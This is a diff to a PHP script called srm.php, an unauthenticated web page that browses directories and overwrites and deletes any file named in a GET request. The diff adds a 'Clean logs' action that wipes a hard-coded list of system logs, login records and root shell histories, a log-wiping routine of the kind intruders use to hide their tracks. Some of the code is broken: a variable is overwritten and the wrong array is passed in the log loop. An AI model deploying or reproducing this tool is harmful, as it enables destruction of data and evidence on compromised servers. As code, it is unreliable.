@@ -1,8 +1,13 @@
 <?php
 /*
-Version 0.1
+Version 0.5
 https://github.com/guglia001/php-secure-remove
 */
+$rw = 40;
+if($_GET['rw']){
+    $rw = $_GET['rw'];
+}
+$rw = $_GET['rw'];
 //error_reporting(E_ERROR | E_PARSE);
         if (empty($_GET['dir'])) {
             $path = getcwd();
@@ -20,14 +25,11 @@ https://github.com/guglia001/php-secure-remove
                 echo "&nbsp;&nbsp;" . "<a href=?dir=" . $drive . ">" . $drive . "</a>";
             }
         }
-        echo "
-        
+        echo " <title> srm.php </title>      
 <center>
 <form action='' method=GET>
 Directory : <input type=text name=dir value='" . $path . "'><input type=submit name=ir value=Enter>
-</form>
-
-";
+</form>";
 
         $archivos = array('dir' => array(), 'file' => array());
         while ($archivo = $dir->read()) {
@@ -68,7 +70,7 @@ Directory : <input type=text name=dir value='" . $path . "'><input type=submit n
             echo "</tr><tr>";
         }
 	print("</TABLE>  How many times rewrite <input type='number' name='rw' value='30'> <input type='submit' value='Delete'> </form>\n");
-	print("<br>  Or enter directly the file <form type='get' > <input type='text' name='delete'> <input type='submit' value='delete' </p>  </form> </center> ");
+	print("<br> <form method='GET' action=''>  Or enter directly the file <input type='text' name='delete'> <input type='submit' value='Delete'>  </form> <form action='' method='GET'> <input type='hidden' name='cleanlogs' value='1' > <input type='submit' value='Clean logs'> </form> </center> <br> <br> <br> <a href='https://github.com/guglia001/php-secure-remove'> GitHub </a> ");
     
 //function to delete
 function srm($file){
@@ -77,19 +79,18 @@ function srm($file){
 	chmod($file, 0777);
 	$size = filesize($file);
 	// For to rewrite the data
-	for ($i=0;$i<$_GET['rw'];$i++)
+	for ($i=0;$i<$rw;$i++)
 	{
 		$src = fopen('/dev/zero', 'rb');
 		$dest = fopen($file, 'wb');
 		stream_copy_to_stream($src, $dest, $size);
 	}
-	echo "deleted ". $file;
+	echo "<br><br><center>Deleted: ". $file. " </center> ";
 	//Finish the delete
 	unlink($file);
 }
 //Funcion para el peso en human-readable
-function view_size($size)
-{
+function view_size($size){
  if (!is_numeric($size)) {return FALSE;}
  else
  {
@@ -102,16 +103,22 @@ function view_size($size)
  }
 }
 //funcion para los permisos
-function dame($file) {
-        return substr(sprintf('%o', fileperms($file)), -4);
+function dame($file) { 
+     return substr(sprintf('%o', fileperms($file)), -4);
     }
-// if to delete
 if ($_GET['delete']){
 	$files = $_GET['delete'];
-	// por cada archivo que se encuentre en el array $files
+	//por cada archivo que se encuentre en el array $files
 	foreach ($files as $file) {
 		srm($file);
 	}
 }
+if ($_GET['cleanlogs'] == 1 ) {
+    $rw = 60;
+    $paths = array("/var/log/lastlog", "/var/log/telnetd", "/var/run/utmp", "/var/log/secure", "/root/.ksh_history", "/root/.bash_history", "/root/.bash_logut", "/var/log/wtmp", "/etc/wtmp", "/var/run/utmp", "/etc/utmp", "/var/log", "/var/adm", "/var/apache/log", "/var/apache/logs", "/usr/local/apache/logs", "/usr/local/apache/logs", "/var/log/acct", "/var/log/xferlog", "/var/log/messages/", "/var/log/proftpd/xferlog.legacy", "/var/log/proftpd.xferlog", "/var/log/proftpd.access_log", "/var/log/httpd/error_log", "/var/log/httpsd/ssl_log", "/var/log/httpsd/ssl.access_log", "/etc/mail/access", "/var/log/qmail", "/var/log/smtpd", "/var/log/samba", "/var/log/samba.log.%m", "/var/lock/samba", "/root/.Xauthority", "/var/log/poplog", "/var/log/news.all", "/var/log/spooler", "/var/log/news", "/var/log/news/news", "/var/log/news/news.all", "/var/log/news/news.crit", "/var/log/news/news.err", "/var/log/news/news.notice", "/var/log/news/suck.err", "/var/log/news/suck.notice", "/var/spool/tmp", "/var/spool/errors", "/var/spool/logs", "/var/spool/locks", "/usr/local/www/logs/thttpd_log", "/var/log/thttpd_log", "/var/log/ncftpd/misclog.txt", "/var/log/nctfpd.errs", "/var/log/auth");
+        foreach($paths as $path) {
+        	srm($paths);
+        }
 
+ }
 ?>
